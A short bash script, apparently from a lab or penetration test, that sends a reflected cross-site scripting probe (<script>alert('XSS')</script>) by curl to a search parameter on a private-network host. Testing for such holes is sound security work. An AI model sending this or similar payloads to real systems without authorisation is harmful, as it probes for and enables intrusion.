#!/bin/bash

TARGET_URL="http://172.30.0.2/search?q="

echo "[*] Testing XSS vulnerability..."
curl "$TARGET_URL<script>alert('XSS')</script>"
